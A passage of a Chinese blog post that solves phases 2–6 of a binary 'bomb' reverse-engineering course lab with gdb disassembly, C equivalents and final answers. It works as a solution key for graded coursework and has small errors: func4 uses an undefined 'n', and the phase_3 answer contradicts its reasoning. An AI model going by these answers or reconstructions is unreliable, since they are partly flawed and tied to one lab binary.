href="实际不存在">6</a>地址赋给%rbp,跳到+27,将%eax设为%rbx指向的前一个<br>数,此时为r[0],比较r[1]和2*r[0]是否相等,不等则爆炸.跳转到+41,％<br>rbx+4,比较%rbx和%rbp,不等跳转到+27,重复,等则跳转到+64结束,成功<br>.可以看出，这是一个循环比较.等价于下面的c语a言</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> *b = &amp;r[<span class="hljs-number">1</span>]; b != &amp;r[<span class="hljs-number">6</span>]; b++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(*b != <span class="hljs-number">2</span> * (*(b - <span class="hljs-number">1</span>)))</span><br><span class="line">        call explode_bomb;</span><br></pre></td></tr></table></figure><p>故答案应该为1 2 4 8 16 32.</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400ef1 &lt;+14&gt;:mov    <span class="hljs-variable">$0x4027cd</span>,%esi</span><br><span class="line">0x0000000000400ef6 &lt;+19&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">0x0000000000400efb &lt;+24&gt;:callq  0x400ba0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x0000000000400f00 &lt;+29&gt;:cmp    <span class="hljs-variable">$0x1</span>,%eax</span><br></pre></td></tr></table></figure><p>查看0x4027cd,<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x4027cd</span><br><span class="line">0x4027cd: <span class="hljs-string">"%d %d"</span></span><br></pre></td></tr></table></figure></p><p>可知,应该是读入了两个整数.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">   0x0000000000400f15 &lt;+50&gt;:jmpq   *0x402500(,%rax,8)</span><br><span class="line">   0x0000000000400f1c &lt;+57&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f21 &lt;+62&gt;:jmp    0x400f28 &lt;phase_3+69&gt;</span><br><span class="line">   0x0000000000400f23 &lt;+64&gt;:mov    <span class="hljs-variable">$0x19c</span>,%eax</span><br><span class="line">   0x0000000000400f28 &lt;+69&gt;:sub    <span class="hljs-variable">$0xcd</span>,%eax</span><br><span class="line">   0x0000000000400f2d &lt;+74&gt;:jmp    0x400f34 &lt;phase_3+81&gt;</span><br><span class="line">   0x0000000000400f2f &lt;+76&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f34 &lt;+81&gt;:add    <span class="hljs-variable">$0x29b</span>,%eax</span><br><span class="line">   0x0000000000400f39 &lt;+86&gt;:jmp    0x400f40 &lt;phase_3+93&gt;</span><br><span class="line">   0x0000000000400f3b &lt;+88&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---</span><br><span class="line">   0x0000000000400f40 &lt;+93&gt;:sub    <span class="hljs-variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f45 &lt;+98&gt;:jmp    0x400f4c &lt;phase_3+105&gt;</span><br><span class="line">   0x0000000000400f47 &lt;+100&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f4c &lt;+105&gt;:add    <span class="hljs-variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f51 &lt;+110&gt;:jmp    0x400f58 &lt;phase_3+117&gt;</span><br><span class="line">   0x0000000000400f53 &lt;+112&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f58 &lt;+117&gt;:sub    <span class="hljs-variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f5d &lt;+122&gt;:jmp    0x400f64 &lt;phase_3+129&gt;</span><br><span class="line">   0x0000000000400f5f &lt;+124&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f64 &lt;+129&gt;:add    <span class="hljs-variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f69 &lt;+134&gt;:jmp    0x400f70 &lt;phase_3+141&gt;</span><br><span class="line">   0x0000000000400f6b &lt;+136&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f70 &lt;+141&gt;:sub    <span class="hljs-variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f75 &lt;+146&gt;:jmp    0x400f81 &lt;phase_3+158&gt;</span><br><span class="line">   0x0000000000400f77 &lt;+148&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f7c &lt;+153&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+158&gt;:cmpl   <span class="hljs-variable">$0x5</span>,0xc(%rsp)</span><br><span class="line">   0x0000000000400f86 &lt;+163&gt;:jg     0x400f8e &lt;phase_3+171&gt;</span><br><span class="line">   0x0000000000400f88 &lt;+165&gt;:cmp    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f8c &lt;+169&gt;:je     0x400f93 &lt;phase_3+176&gt;</span><br><span class="line">   0x0000000000400f8e &lt;+171&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure></p><p>由这段汇编代码可知,这是一段switch语句,使用输入的第一个值作为key,<br>经过对应跳转位置的操作后应与第二个数相等.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x *（0x402500 + 32）</span><br><span class="line"><span class="hljs-variable">$1</span> = 0x400f47</span><br></pre></td></tr></table></figure></p><p>那么第一个数为0时,跳转到0x400f23处,那么第二个数应该为此处的0x0,<br>故一组答案为4 0;</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_4</span><br><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_4:</span><br><span class="line">   0x0000000000400fd0 &lt;+0&gt;:sub    <span class="hljs-variable">$0x18</span>,%rsp</span><br><span class="line">   0x0000000000400fd4 &lt;+4&gt;:lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400fd9 &lt;+9&gt;:lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400fde &lt;+14&gt;:mov    <span class="hljs-variable">$0x4027cd</span>,%esi</span><br><span class="line">   0x0000000000400fe3 &lt;+19&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400fe8 &lt;+24&gt;:callq  0x400ba0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400fed &lt;+29&gt;:cmp    <span class="hljs-variable">$0x2</span>,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+32&gt;:jne    0x400ffe &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+34&gt;:mov    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400ff6 &lt;+38&gt;:sub    <span class="hljs-variable">$0x2</span>,%eax</span><br><span class="line">   0x0000000000400ff9 &lt;+41&gt;:cmp    <span class="hljs-variable">$0x2</span>,%eax</span><br><span class="line">   0x0000000000400ffc &lt;+44&gt;:jbe    0x401003 &lt;phase_4+51&gt;</span><br><span class="line">   0x0000000000400ffe &lt;+46&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401003 &lt;+51&gt;:mov    0xc(%rsp),%esi</span><br><span class="line">   0x0000000000401007 &lt;+55&gt;:mov    <span class="hljs-variable">$0x9</span>,%edi</span><br><span class="line">   0x000000000040100c &lt;+60&gt;:callq  0x400f98 &lt;func4&gt;</span><br><span class="line">   0x0000000000401011 &lt;+65&gt;:cmp    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000401015 &lt;+69&gt;:je     0x40101c &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401017 &lt;+71&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040101c &lt;+76&gt;:add    <span class="hljs-variable">$0x18</span>,%rsp</span><br><span class="line">   0x0000000000401020 &lt;+80&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>由代码易知,phase_4读入了两个数,第二个数在2-4之间,然后将第二个数作为<br>func4的第二个参数,func4第一个参数为9,输入的第一个数必须和func4返回值相等.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas func4 </span><br><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> func4:</span><br><span class="line">   0x0000000000400f98 &lt;+0&gt;:push   %r12</span><br><span class="line">   0x0000000000400f9a &lt;+2&gt;:push   %rbp</span><br><span class="line">   0x0000000000400f9b &lt;+3&gt;:push   %rbx</span><br><span class="line">   0x0000000000400f9c &lt;+4&gt;:mov    %edi,%ebx</span><br><span class="line">   0x0000000000400f9e &lt;+6&gt;:<span class="hljs-built_in">test</span>   %edi,%edi</span><br><span class="line">   0x0000000000400fa0 &lt;+8&gt;:jle    0x400fc6 &lt;func4+46&gt;</span><br><span class="line">   0x0000000000400fa2 &lt;+10&gt;:mov    %esi,%ebp</span><br><span class="line">   0x0000000000400fa4 &lt;+12&gt;:mov    %esi,%eax</span><br><span class="line">   0x0000000000400fa6 &lt;+14&gt;:cmp    <span class="hljs-variable">$0x1</span>,%edi</span><br><span class="line">   0x0000000000400fa9 &lt;+17&gt;:je     0x400fcb &lt;func4+51&gt;</span><br><span class="line">   0x0000000000400fab &lt;+19&gt;:lea    -0x1(%rdi),%edi</span><br><span class="line">   0x0000000000400fae &lt;+22&gt;:callq  0x400f98 &lt;func4&gt;</span><br><span class="line">   0x0000000000400fb3 &lt;+27&gt;:lea    (%rax,%rbp,1),%r12d</span><br><span class="line">   0x0000000000400fb7 &lt;+31&gt;:lea    -0x2(%rbx),%edi</span><br><span class="line">   0x0000000000400fba &lt;+34&gt;:mov    %ebp,%esi</span><br><span class="line">   0x0000000000400fbc &lt;+36&gt;:callq  0x400f98 &lt;func4&gt;</span><br><span class="line">   0x0000000000400fc1 &lt;+41&gt;:add    %r12d,%eax</span><br><span class="line">   0x0000000000400fc4 &lt;+44&gt;:jmp    0x400fcb &lt;func4+51&gt;</span><br><span class="line">   0x0000000000400fc6 &lt;+46&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400fcb &lt;+51&gt;:pop    %rbx</span><br><span class="line">   0x0000000000400fcc &lt;+52&gt;:pop    %rbp</span><br><span class="line">   0x0000000000400fcd &lt;+53&gt;:pop    %r12</span><br><span class="line">   0x0000000000400fcf &lt;+55&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p><p>此函数等价于下面的c代码<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func4</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(a &lt;= <span class="hljs-number">0</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span>(a == <span class="hljs-number">1</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> b;</span><br><span class="line">    <span class="hljs-keyword">return</span> b + func4(a - <span class="hljs-number">1</span>, b) + func4(n - <span class="hljs-number">2</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>穷举2-4的值即可得到答案,取答案为176 2</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_5</span><br><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_5:</span><br><span class="line">   0x0000000000401021 &lt;+0&gt;:push   %rbx</span><br><span class="line">   0x0000000000401022 &lt;+1&gt;:mov    %rdi,%rbx</span><br><span class="line">   0x0000000000401025 &lt;+4&gt;:callq  0x401261 &lt;string_length&gt;</span><br><span class="line">   0x000000000040102a &lt;+9&gt;:cmp    <span class="hljs-variable">$0x6</span>,%eax</span><br><span class="line">   0x000000000040102d &lt;+12&gt;:je     0x401034 &lt;phase_5+19&gt;</span><br><span class="line">   0x000000000040102f &lt;+14&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401034 &lt;+19&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000401039 &lt;+24&gt;:mov    <span class="hljs-variable">$0x0</span>,%edx</span><br><span class="line">   0x000000000040103e &lt;+29&gt;:movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x0000000000401042 &lt;+33&gt;:and    <span class="hljs-variable">$0xf</span>,%ecx</span><br><span class="line">   0x0000000000401045 &lt;+36&gt;:add    0x402540(,%rcx,4),%edx</span><br><span class="line">   0x000000000040104c &lt;+43&gt;:add    <span class="hljs-variable">$0x1</span>,%rax</span><br><span class="line">   0x0000000000401050 &lt;+47&gt;:cmp    <span class="hljs-variable">$0x6</span>,%rax</span><br><span class="line">   0x0000000000401054 &lt;+51&gt;:jne    0x40103e &lt;phase_5+29&gt;</span><br><span class="line">   0x0000000000401056 &lt;+53&gt;:cmp    <span class="hljs-variable">$0x27</span>,%edx</span><br><span class="line">   0x0000000000401059 &lt;+56&gt;:je     0x401060 &lt;phase_5+63&gt;</span><br><span class="line">   0x000000000040105b &lt;+58&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401060 &lt;+63&gt;:pop    %rbx</span><br><span class="line">   0x0000000000401061 &lt;+64&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>由汇编代码可知,需要输入一个长度为6的字符串.令该字符串为input,+36处出现的<br>数组为array,则该汇编等价于下面代码.<br><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)</span><br><span class="line">    sum += <span class="hljs-built_in">array</span>[ input[i] &amp; <span class="hljs-number">0xf</span> ];</span><br></pre></td></tr></table></figure></p><p>意为遍历输入字符串,取该字符串低4位作为array下标,取出array值相加.<br>查看array的值<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x *0x402540@16</span><br><span class="line"><span class="hljs-variable">$2</span> = &#123;0x2, 0xa, 0x6, 0x1, 0xc, 0x10, 0x9, 0x3, 0x4, 0x7, 0xe, 0x5, 0xb, 0x8, </span><br><span class="line">  0xf, 0xd&#125;</span><br></pre></td></tr></table></figure></p><p>题目要求sum = 0x27,故从array中选出6个和为0x27的数,通过这6个数的下标找出对应字符.<br>答案应为01347L;</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>因为课程未对后续两关作要求,故不做特别详细的解答.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_6</span><br><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_6:</span><br><span class="line">   0x0000000000401062 &lt;+0&gt;:push   %r13</span><br><span class="line">   0x0000000000401064 &lt;+2&gt;:push   %r12</span><br><span class="line">   0x0000000000401066 &lt;+4&gt;:push   %rbp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:push   %rbx</span><br><span class="line">   0x0000000000401068 &lt;+6&gt;:sub    <span class="hljs-variable">$0x58</span>,%rsp</span><br><span class="line">   0x000000000040106c &lt;+10&gt;:lea    0x30(%rsp),%rsi</span><br><span class="line">   0x0000000000401071 &lt;+15&gt;:callq  0x40151a &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000401076 &lt;+20&gt;:lea    0x30(%rsp),%r13</span><br><span class="line">   0x000000000040107b &lt;+25&gt;:mov    <span class="hljs-variable">$0x0</span>,%r12d</span><br><span class="line">   0x0000000000401081 &lt;+31&gt;:mov    %r13,%rbp</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:mov    0x0(%r13),%eax</span><br><span class="line">   0x0000000000401088 &lt;+38&gt;:sub    <span class="hljs-variable">$0x1</span>,%eax</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:cmp    <span class="hljs-variable">$0x5</span>,%eax</span><br><span class="line">   0x000000000040108e &lt;+44&gt;:jbe    0x401095 &lt;phase_6+51&gt;</span><br><span class="line">   0x0000000000401090 &lt;+46&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401095 &lt;+51&gt;:add    <span class="hljs-variable">$0x1</span>,%r12d</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:cmp    <span class="hljs-variable">$0x6</span>,%r12d</span><br><span class="line">   0x000000000040109d &lt;+59&gt;:jne    0x4010a6 &lt;phase_6+68&gt;</span><br><span class="line">   0x000000000040109f &lt;+61&gt;:mov    <span class="hljs-variable">$0x0</span>,%esi</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:jmp    0x4010e8 &lt;phase_6+134&gt;</span><br><span class="line">   0x00000000004010a6 &lt;+68&gt;:mov    %r12d,%ebx</span><br><span class="line">   0x00000000004010a9 &lt;+71&gt;:movslq %ebx,%rax</span><br><span class="line">---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:mov    0x30(%rsp,%rax,4),%eax</span><br><span class="line">   0x00000000004010b0 &lt;+78&gt;:cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:jne    0x4010ba &lt;phase_6+88&gt;</span><br><span class="line">   0x00000000004010b5 &lt;+83&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010ba &lt;+88&gt;:add    <span class="hljs-variable">$0x1</span>,%ebx</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:cmp    <span class="hljs-variable">$0x5</span>,%ebx</span><br><span class="line">   0x00000000004010c0 &lt;+94&gt;:jle    0x4010a9 &lt;phase_6+71&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:add    <span class="hljs-variable">$0x4</span>,%r13</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:jmp    0x401081 &lt;phase_6+31&gt;</span><br><span class="line">   0x00000000004010c8 &lt;+102&gt;:mov    0x8(%rdx),%rdx</span><br><span class="line">   0x00000000004010cc &lt;+106&gt;:add    <span class="hljs-variable">$0x1</span>,%eax</span><br><span class="line">   0x00000000004010cf &lt;+109&gt;:cmp    %ecx,%eax</span><br><span class="line">   0x00000000004010d1 &lt;+111&gt;:jne    0x4010c8 &lt;phase_6+102&gt;</span><br><span class="line">   0x00000000004010d3 &lt;+113&gt;:jmp    0x4010da &lt;phase_6+120&gt;</span><br><span class="line">   0x00000000004010d5 &lt;+115&gt;:mov    <span class="hljs-variable">$0x603410</span>,%edx</span><br><span class="line">   0x00000000004010da &lt;+120&gt;:mov    %rdx,(%rsp,%rsi,2)</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:add    <span class="hljs-variable">$0x4</span>,%rsi</span><br><span class="line">   0x00000000004010e2 &lt;+128&gt;:cmp    <span class="hljs-variable">$0x18</span>,%rsi</span><br><span class="line">   0x00000000004010e6 &lt;+132&gt;:je     0x4010fd &lt;phase_6+155&gt;</span><br><span class="line">   0x00000000004010e8 &lt;+134&gt;:mov    0x30(%rsp,%rsi,1),%ecx</span><br><span class="line">   0x00000000004010ec &lt;+138&gt;:cmp    <span class="hljs-variable">$0x1</span>,%ecx</span><br><span class="line">   0x00000000004010ef &lt;+141&gt;:jle    0x4010d5 &lt;phase_6+115&gt;</span><br><span class="line">   0x00000000004010f1 &lt;+143&gt;:mov    <span class="hljs-variable">$0x1</span>,%eax</span><br><span class="line">---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---</span><br><span class="line">   0x00000000004010f6 &lt;+148&gt;:mov    <span class="hljs-variable">$0x603410</span>,%edx</span><br><span class="line">   0x00000000004010fb &lt;+153&gt;:jmp    0x4010c8 &lt;phase_6+102&gt;</span><br><span class="line">   0x00000000004010fd &lt;+155&gt;:mov    (%rsp),%rbx</span><br><span class="line">   0x0000000000401101 &lt;+159&gt;:lea    0x8(%rsp),%rax</span><br><span class="line">   0x0000000000401106 &lt;+164&gt;:lea    0x30(%rsp),%rsi</span><br><span class="line">   0x000000000040110b &lt;+169&gt;:mov    %rbx,%rcx</span><br><span class="line">   0x000000000040110e &lt;+172&gt;:mov    (%rax),%rdx</span><br><span class="line">   0x0000000000401111 &lt;+175&gt;:mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x0000000000401115 &lt;+179&gt;:add    <span class="hljs-variable">$0x8</span>,%rax</span><br><span class="line">   0x0000000000401119 &lt;+183&gt;:cmp    %rsi,%rax</span><br><span class="line">   0x000000000040111c &lt;+186&gt;:je     0x401123 &lt;phase_6+193&gt;</span><br><span class="line">   0x000000000040111e &lt;+188&gt;:mov    %rdx,%rcx</span><br><span class="line">   0x0000000000401121 &lt;+191&gt;:jmp    0x40110e &lt;phase_6+172&gt;</span><br><span class="line">   0x0000000000401123 &lt;+193&gt;:movq   <span class="hljs-variable">$0x0</span>,0x8(%rdx)</span><br><span class="line">   0x000000000040112b &lt;+201&gt;:mov    <span class="hljs-variable">$0x5</span>,%ebp</span><br><span class="line">   0x0000000000401130 &lt;+206&gt;:mov    0x8(%rbx),%rax</span><br><span class="line">   0x0000000000401134 &lt;+210&gt;:mov    (%rax),%eax</span><br><span class="line">   0x0000000000401136 &lt;+212&gt;:cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000401138 &lt;+214&gt;:jge    0x40113f &lt;phase_6+221&gt;</span><br><span class="line">   0x000000000040113a &lt;+216&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040113f &lt;+221&gt;:mov    0x8(%rbx),%rbx</span><br><span class="line">   0x0000000000401143 &lt;+225&gt;:sub    <span class="hljs-variable">$0x1</span>,%ebp</span><br><span class="line">   0x0000000000401146 &lt;+228&gt;:jne    0x401130 &lt;phase_6+206&gt;</span><br><span class="line">---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---</span><br><span class="line">   0x0000000000401148 &lt;+230&gt;:add    <span class="hljs-variable">$0x58</span>,%rsp</span><br><span class="line">   0x000000000040114c &lt;+234&gt;:pop    %rbx</span><br><span class="line">   0x000000000040114d &lt;+235&gt;:pop    %rbp</span><br><span class="line">   0x000000000040114e &lt;+236&gt;:pop    %r12</span><br><span class="line">   0x0000000000401150 &lt;+238&gt;:pop    %r13</span><br><span class="line">   0x0000000000401152 &lt;+240&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p><p>汇编代码很长.其意为输入6个互不相等的数,介于1-6.按这6个数的值从位于地址0x603410的链表中选出对应位置的<br>节点指针,组成一个数组.按选出的顺序将这六个节点组成新的链表,然后检查这个链表是否为降序.<br>查看链表的值.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x *(0x603410)</span><br><span class="line"><span class="hljs-variable">$3</span> = 0x1cf</span><br><span class="line">(gdb) p/x *(0x603410 + 8)</span><br><span class="line"><span class="hljs-variable">$4</span> = 0x603420</span><br><span class="line">(gdb) p/x *(0x603420)</span><br><span class="line"><span class="hljs-variable">$5</span> = 0x188</span><br><span class="line">(gdb) p/x *(0x603420 + 8)</span><br><span 